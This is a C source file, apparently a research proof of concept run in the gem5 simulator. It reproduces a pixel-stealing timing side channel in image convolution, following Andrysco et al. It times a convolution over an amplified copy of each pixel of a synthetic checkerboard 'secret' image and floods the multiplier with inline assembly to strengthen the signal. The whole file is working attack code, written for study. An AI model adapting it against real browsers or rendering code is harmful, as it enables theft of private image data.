 #include <stdio.h>
 #include <stdint.h>
 #include <stddef.h>
 #include <stdbool.h>
 #include <stdlib.h>
 #include <gem5/m5ops.h>

const ptrdiff_t B8G8R8A8_COMPONENT_BYTEOFFSET_B = 0;
const ptrdiff_t B8G8R8A8_COMPONENT_BYTEOFFSET_G = 1;
const ptrdiff_t B8G8R8A8_COMPONENT_BYTEOFFSET_R = 2;
const ptrdiff_t B8G8R8A8_COMPONENT_BYTEOFFSET_A = 3;

static inline unsigned umin(unsigned a, unsigned b) {
  return a - ((a - b) & -(a > b));
}

static inline int32_t ClampToNonZero(int32_t a) { return a * (a >= 0); }

// Flood the multiply unit with dependent mul chains in assembly with loop
static inline void flood_multiply(int32_t count) {
    int32_t acc, mult, cnt;
    __asm__ volatile(
        "mov %w0, #2\n\t"          // Accumulator
        "mov %w1, #3\n\t"          // Multiplier
        "mov %w2, %w3\n\t"         // Loop counter
        "1:\n\t"
        // Single chain: 30 dependent multiplies per iteration
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "mul %w0, %w0, %w1\n\t"
        "subs %w2, %w2, #1\n\t"
        "bne 1b\n\t"
        : "=&r" (acc), "=&r" (mult), "=&r" (cnt)
        : "r" (count)
        : "cc"
    );
}

static inline uint8_t ColorComponentAtPoint(const uint8_t* aData,
                                            ptrdiff_t aStride,
                                            const uint8_t* aBoundsBegin,
                                            const uint8_t* aBoundsEnd,
                                            int32_t x, int32_t y, ptrdiff_t bpp,
                                            ptrdiff_t c) {
  return aData[y * aStride + bpp * x + c];
}

__attribute__((noinline))
static void ConvolvePixel(const uint8_t* aSourceData, uint8_t* aTargetData,
                          int32_t aWidth, int32_t aHeight,
                          int32_t aSourceStride, int32_t aTargetStride,
                          const uint8_t* aSourceBegin,
                          const uint8_t* aSourceEnd, int32_t aX, int32_t aY,
                          const int32_t* aKernel, int32_t aBias, int32_t shiftL,
                          int32_t shiftR, bool aPreserveAlpha, int32_t aOrderX,
                          int32_t aOrderY, int32_t aTargetX, int32_t aTargetY,
                          int32_t aKernelUnitLengthX,
                          int32_t aKernelUnitLengthY) {
  flood_multiply(20);

  int32_t sum[4] = {0, 0, 0, 0};
  int32_t offsets[4] = {
      B8G8R8A8_COMPONENT_BYTEOFFSET_R, B8G8R8A8_COMPONENT_BYTEOFFSET_G,
      B8G8R8A8_COMPONENT_BYTEOFFSET_B, B8G8R8A8_COMPONENT_BYTEOFFSET_A};
  int32_t channels = aPreserveAlpha ? 3 : 4;
  int32_t roundingAddition = shiftL == 0 ? 0 : 1 << (shiftL - 1);

  for (int32_t y = 0; y < aOrderY; y++) {
    int32_t sampleY = aY + (y - aTargetY) * aKernelUnitLengthY;
    for (int32_t x = 0; x < aOrderX; x++) {
      int32_t sampleX = aX + (x - aTargetX) * aKernelUnitLengthX;
      for (int32_t i = 0; i < channels; i++) {
        sum[i] +=
            aKernel[aOrderX * y + x] *
            ColorComponentAtPoint(aSourceData, aSourceStride, aSourceBegin,
                                  aSourceEnd, sampleX, sampleY, 4, offsets[i]);
        // Memory barrier to serialize multiply operations
      }
    }
  }
  for (int32_t i = 0; i < channels; i++) {
    int32_t clamped =
        umin(ClampToNonZero(sum[i] + aBias), 255 << shiftL >> shiftR);
    aTargetData[aY * aTargetStride + 4 * aX + offsets[i]] =
        (clamped + roundingAddition) << shiftR >> shiftL;
  }
  if (aPreserveAlpha) {
    aTargetData[aY * aTargetStride + 4 * aX + B8G8R8A8_COMPONENT_BYTEOFFSET_A] =
        aSourceData[aY * aSourceStride + 4 * aX +
                    B8G8R8A8_COMPONENT_BYTEOFFSET_A];
  }
    __asm__ volatile("dsb sy\n\t isb" ::: "memory");
}

// Fill an amplified image buffer with a single pixel value (blown up to amplified_size x amplified_size)
static void fillAmplifiedImage(uint8_t* data, int32_t amplified_size, uint8_t r, uint8_t g, uint8_t b, uint8_t a) {
    for (int32_t y = 0; y < amplified_size; y++) {
        for (int32_t x = 0; x < amplified_size; x++) {
            int32_t idx = (y * amplified_size + x) * 4;
            data[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_B] = b;
            data[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_G] = g;
            data[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_R] = r;
            data[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_A] = a;
        }
    }
}

// Run convolution over the entire amplified image and return (for timing measurement)
__attribute__((noinline))
static void convolveFullImage(uint8_t* sourceData, uint8_t* targetData,
                               int32_t width, int32_t height,
                               int32_t sourceStride, int32_t targetStride,
                               const int32_t* kernel, int32_t bias,
                               int32_t shiftL, int32_t shiftR,
                               bool preserveAlpha, int32_t orderX, int32_t orderY,
                               int32_t targetX, int32_t targetY,
                               int32_t kernelUnitLengthX, int32_t kernelUnitLengthY) {
    // flood_multiply(50);
    for (int32_t y = targetY; y < height - (orderY - 1 - targetY); y++) {
        for (int32_t x = targetX; x < width - (orderX - 1 - targetX); x++) {
            ConvolvePixel(sourceData, targetData, width, height, sourceStride, targetStride,
                         sourceData, sourceData + (width * height * 4), x, y, kernel, bias,
                         shiftL, shiftR, preserveAlpha, orderX, orderY, targetX, targetY,
                         kernelUnitLengthX, kernelUnitLengthY);
        }
    }
    //__asm__ volatile("dsb sy\n\t isb" ::: "memory");
}

int main() {
    // ========================================
    // PIXEL STEALING POC - END TO END EXPLOIT
    // ========================================
    //
    // Attack methodology (based on Andrysco et al.):
    // 1. Secret image: small image we want to steal (e.g., 4x4 checkerboard)
    // 2. For each pixel in secret image:
    //    a. Create amplified image (1000x1000) filled with that single pixel value
    //    b. Run convolution over entire amplified image
    //    c. Measure end-to-end timing
    //    d. Timing reveals if pixel value is 0/1 (fast) vs other values (slow)
    // 3. Reconstruct the secret image from timing measurements

    // Secret image dimensions (the image we want to steal)
    const int32_t secret_width = 4;
    const int32_t secret_height = 4;

    // Amplified image size - larger = more timing signal
    // With 3->1 cycle difference, we need large amplification
    const int32_t amplified_size = 250;

    // Allocate secret image (checkerboard pattern - our "victim" data)
    uint8_t* secretImage = (uint8_t*)malloc(secret_width * secret_height * 4);

    // Create checkerboard pattern: black (0) and white (255)
    // Disable output buffering so prints show up immediately in gem5
    setbuf(stdout, NULL);

    printf("=== SECRET IMAGE (victim data) ===\n");
    for (int32_t y = 0; y < secret_height; y++) {
        for (int32_t x = 0; x < secret_width; x++) {
            int32_t idx = (y * secret_width + x) * 4;
            uint8_t value = ((x + y) % 2 == 0) ? 0 : 255;
            secretImage[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_B] = value;
            secretImage[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_G] = value;
            secretImage[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_R] = value;
            secretImage[idx + B8G8R8A8_COMPONENT_BYTEOFFSET_A] = 255;
            printf("%3d ", value);
        }
        printf("\n");
    }
    printf("\n");

    // Allocate amplified image buffers
    uint8_t* amplifiedSource = (uint8_t*)malloc(amplified_size * amplified_size * 4);
    uint8_t* amplifiedTarget = (uint8_t*)malloc(amplified_size * amplified_size * 4);

    // Kernel: all 2's to avoid trivial multiplication on kernel side
    // This ensures timing depends ONLY on pixel values
    int32_t kernel[9] = {2, 2, 2,
                         2, 2, 2,
                         2, 2, 2};

    int32_t bias = 0;
    int32_t shiftL = 0;
    int32_t shiftR = 0;
    bool preserveAlpha = false;
    int32_t orderX = 3;
    int32_t orderY = 3;
    int32_t targetX = 1;
    int32_t targetY = 1;
    int32_t kernelUnitLengthX = 1;
    int32_t kernelUnitLengthY = 1;

    int32_t amplifiedStride = amplified_size * 4;

    printf("=== PIXEL STEALING ATTACK ===\n");
    printf("Amplified size: %dx%d\n", amplified_size, amplified_size);
    printf("Convolutions per pixel: %d\n", (amplified_size - 2) * (amplified_size - 2));
    printf("Multiplications per convolution: %d\n", orderX * orderY * 4);
    printf("\n");

    printf("=== TIMING EACH PIXEL ===\n");

    // For each pixel in the secret image
    for (int32_t py = 0; py < secret_height; py++) {
        for (int32_t px = 0; px < secret_width; px++) {
            int32_t secretIdx = (py * secret_width + px) * 4;

            // Get the secret pixel's color components
            uint8_t r = secretImage[secretIdx + B8G8R8A8_COMPONENT_BYTEOFFSET_R];
            uint8_t g = secretImage[secretIdx + B8G8R8A8_COMPONENT_BYTEOFFSET_G];
            uint8_t b = secretImage[secretIdx + B8G8R8A8_COMPONENT_BYTEOFFSET_B];
            uint8_t a = secretImage[secretIdx + B8G8R8A8_COMPONENT_BYTEOFFSET_A];

            // Fill amplified image with this single pixel value
            fillAmplifiedImage(amplifiedSource, amplified_size, r, g, b, a);
            fillAmplifiedImage(amplifiedTarget, amplified_size, 0, 0, 0, 0);

            // Measure time using m5_rpns() (returns simulation time in picoseconds)
            uint64_t start_time = m5_rpns();

            convolveFullImage(amplifiedSource, amplifiedTarget,
                             amplified_size, amplified_size,
                             amplifiedStride, amplifiedStride,
                             kernel, bias, shiftL, shiftR,
                             preserveAlpha, orderX, orderY,
                             targetX, targetY,
                             kernelUnitLengthX, kernelUnitLengthY);

            uint64_t end_time = m5_rpns();
            uint64_t elapsed_ps = end_time - start_time;
            double elapsed_us = elapsed_ps / 1e6;  // ps to us

            printf("Pixel (%d,%d) value=%3d: %.3f us\n", px, py, r, elapsed_us);
        }
    }

    printf("\n=== ATTACK COMPLETE ===\n");

    free(secretImage);
    free(amplifiedSource);
    free(amplifiedTarget);

    return 0;
}